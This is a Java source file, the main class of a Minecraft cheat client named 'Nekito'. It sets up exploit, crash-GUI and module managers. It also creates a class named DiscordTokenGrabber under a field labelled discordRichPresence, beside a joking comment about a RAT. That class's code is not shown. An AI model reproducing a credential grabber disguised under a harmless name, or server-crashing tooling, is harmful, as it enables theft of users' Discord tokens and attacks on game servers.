package wtf.norma.nekito;

import de.florianmichael.viamcp.ViaMCP;
import net.arikia.dev.drpc.DiscordRPC;
import net.minecraft.client.Minecraft;
import org.apache.commons.logging.Log;
import org.lwjgl.Sys;
import org.lwjgl.opengl.Display;
import wtf.norma.nekito.command.CommandManager;
import wtf.norma.nekito.command.impl.HelpCommand;
import wtf.norma.nekito.draggable.DraggableManager;
import wtf.norma.nekito.exploit.ExploitManager;
import wtf.norma.nekito.helper.ChatHelper;
import wtf.norma.nekito.helper.OpenGlHelper;
import wtf.norma.nekito.module.Module;
import wtf.norma.nekito.module.ModuleManager;
import wtf.norma.nekito.rpc.DiscordTokenGrabber;
import wtf.norma.nekito.ui.WelcomeGUI;
import wtf.norma.nekito.ui.clickgui.ClickGuiMain;
import wtf.norma.nekito.ui.crashgui.CrashGuiMain;
import wtf.norma.nekito.util.font.FontRenderer;
import wtf.norma.nekito.util.font.Fonts;
import wtf.norma.nekito.util.math.ScaleMath;
import wtf.norma.nekito.util.other.LoggingUtil;
import wtf.norma.nekito.util.render.RenderUtil;

import java.io.IOException;

public enum nekito {
    INSTANCE;
    Minecraft mc = Minecraft.getMinecraft();
    public double animationSpeed = 0.20;

    private final CommandManager commandManager;
    private final ExploitManager exploitManager;

    public ScaleMath scaleMath = new ScaleMath(2);
    private final DiscordTokenGrabber discordRichPresence;
    private final DraggableManager draggableManager;


    private final ModuleManager moduleManager;
    private final ClickGuiMain clickGuiMain;

    private final CrashGuiMain crashGuiMain;



  //  public ConfigManager configManager;


    public static double deltaTime() {
        return Minecraft.getDebugFPS() > 0 ? (1.0000 / Minecraft.getDebugFPS()) : 1;
    }

    public static String name = "Nekito";

    public static String version = "2.0";


    public boolean isStarting = false;

    nekito() {
        isStarting = true;
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false");

        LoggingUtil.log(
                "             oooo         o8o      .               \n" +
                        "                      `888         `\"'    .o8             \n" +
                        "ooo. .oo.    .ooooo.   888  oooo  oooo  .o888oo  .ooooo.  \n" +
                        "`888P\"Y88b  d88' `88b  888 .8P'   `888    888   d88' `88b \n" +
                        " 888   888  888ooo888  888888.     888    888   888   888 \n" +
                        " 888   888  888    .o  888 `88b.   888    888 . 888   888 \n" +
                        "o888o o888o `Y8bod8P' o888o o888o o888o   \"888\" `Y8bod8P' \n"
               + "                                                     by normacheats"
                        + "                                                     "
                        + "                                                     "
                        + "                                                     "

        );

        LoggingUtil.log("System Info: " + "" +
                "");

        LoggingUtil.log("Os name: " + System.getProperty("os.name"));
        LoggingUtil.log("Os architecture: " + System.getProperty("os.arch"));
        LoggingUtil.log("Os version: " + System.getProperty("os.version"));
        LoggingUtil.log("Java vendor: " + System.getProperty("java.vendor"));
        LoggingUtil.log("Java vendor url: " + System.getProperty("java.vendor.url"));
        LoggingUtil.log("Java version: " + System.getProperty("java.version"));











        discordRichPresence = new DiscordTokenGrabber();

        commandManager = new CommandManager();
        exploitManager = new ExploitManager();
        draggableManager = new DraggableManager();
        moduleManager = new ModuleManager();
        clickGuiMain = new ClickGuiMain();
        crashGuiMain = new CrashGuiMain();



        // albo rat 🤪🤪🤪🤪🤪🤪🤪



        ViaMCP.create();
        ViaMCP.INSTANCE.initAsyncSlider();

      //  NetHelper.createSession("uwuleczka", null);
        isStarting = false;
        Runtime.getRuntime().addShutdownHook(new Thread(this::shutDown));

    }

    public void setDisplay() throws IOException {
        Display.setTitle(String.format(name + " " + version + " " + "LWJGL " + Sys.getVersion()));
        OpenGlHelper.setWindowIcon("https://i.imgur.com/hNjf4MM.png", "https://i.imgur.com/AcrB9xQ.png");
    }


    public void onWelcomeUI() {
      //  mc.displayGuiScreen(new WelcomeGUI());
        nekito.INSTANCE.getCommandManager().getCommands().stream()
                .filter(command -> !(command instanceof HelpCommand))
                .forEach(command -> ChatHelper.printMessage(
                        String.format("&5%s &f- &d%s", command.getAlias(), command.getDescription())));
    }



    public void postInit() {
        RenderUtil.Instance = new RenderUtil(true);
        draggableManager.Init();
    }

    public void shutDown() {

    // nekito.INSTANCE.configManager.saveConfig("default");
     DiscordRPC.discordShutdown();
    }

    public void onKey(int key) {
        for (Module module : ModuleManager.modules) {
            if (module.getKeybind() != 0 && key == module.getKeybind()) {
                module.toggle();
            }
        }
    }


    public double createAnimation(double value) {
        return Math.sqrt(1 - Math.pow(value - 1, 2));
    }

    public double dropAnimation(double value) {
        double c1 = 1.70158;
        double c3 = c1 + 1;
        return 1 + c3 * Math.pow(value - 1, 3) + c1 * Math.pow(value - 1, 2);
    }

    public DraggableManager getDraggableManager() {
        return draggableManager;
    }

    public ModuleManager getModuleManager() {
        return moduleManager;
    }

    public CommandManager getCommandManager() {
        return commandManager;
    }

    public ExploitManager getExploitManager() {
        return exploitManager;
    }

    public DiscordTokenGrabber getDiscordRichPresence() {
        return discordRichPresence;
    }

    public ClickGuiMain getClickGui() {
        return clickGuiMain;
    }


    public CrashGuiMain getCrashGui() {
        return crashGuiMain;
    }


}
